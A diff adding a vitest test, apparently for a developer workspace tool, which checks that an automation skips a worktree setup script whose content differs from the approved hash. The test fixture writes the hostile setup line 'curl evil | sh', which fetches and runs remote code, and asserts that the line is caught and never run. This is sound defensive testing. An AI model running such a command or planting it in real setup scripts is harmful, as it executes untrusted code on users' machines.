@@ -1,8 +1,19 @@
 import path from 'node:path'
-import { describe, expect, it } from 'vitest'
+import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { describe, expect, it, vi } from 'vitest'
 import type { Automation } from '../../shared/automations-types'
 import type { Repo } from '../../shared/repo-types'
+import { getDefaultSettings } from '../../shared/constants'
+import { hashOrcaHookTrustContent } from '../workspace-hooks/created-worktree-setup-trust'
+import { prepareRuntimeLocalWorktreeSetup } from '../runtime/workspaces/creation/runtime-local-worktree-setup'
 import { buildHeadlessAutomationWorktreeCreateArgs } from './headless-workspace-create'
+
+const runner = vi.hoisted(() => ({ createSetupRunnerScript: vi.fn() }))
+vi.mock('../workspace-hooks/worktree-runner-script', () => ({
+  createSetupRunnerScript: runner.createSetupRunnerScript,
+  resolveSetupRunnerShell: () => undefined
+}))
 
 const repoPath = path.join('tmp', 'orca')
 
@@ -93,5 +104,37 @@ describe('headless automation workspace create args', () => {
         hostId: 'ssh:ssh-target-1'
       }
     })
+  })
+
+  it('skips setup when the created branch differs from the content approved for the automation', async () => {
+    const worktreePath = mkdtempSync(path.join(tmpdir(), 'orca-automation-setup-'))
+    try {
+      writeFileSync(path.join(worktreePath, 'orca.yaml'), 'scripts:\n  setup: curl evil | sh\n')
+      const args = buildHeadlessAutomationWorktreeCreateArgs({
+        automation: {
+          ...automation,
+          setupDecision: 'run',
+          setupTrustHash: hashOrcaHookTrustContent('echo setup')
+        },
+        run: { id: 'run-1', title: 'Nightly review run', scheduledFor: 123 },
+        repo,
+        createdAt: 123
+      })
+      expect(args.approvedSetupHash).toBe(hashOrcaHookTrustContent('echo setup'))
+
+      const prepared = await prepareRuntimeLocalWorktreeSetup({
+        request: args,
+        repo: { ...repo, hookSettings: undefined },
+        worktreePath,
+        settings: getDefaultSettings(tmpdir()),
+        runtimeTarget: undefined,
+        shouldUseSetupRunner: true
+      })
+
+      expect(runner.createSetupRunnerScript).not.toHaveBeenCalled()
+      expect(prepared.setupTrustMismatch?.scriptContent).toBe('curl evil | sh')
+    } finally {
+      rmSync(worktreePath, { recursive: true, force: true })
+    }
   })
 })
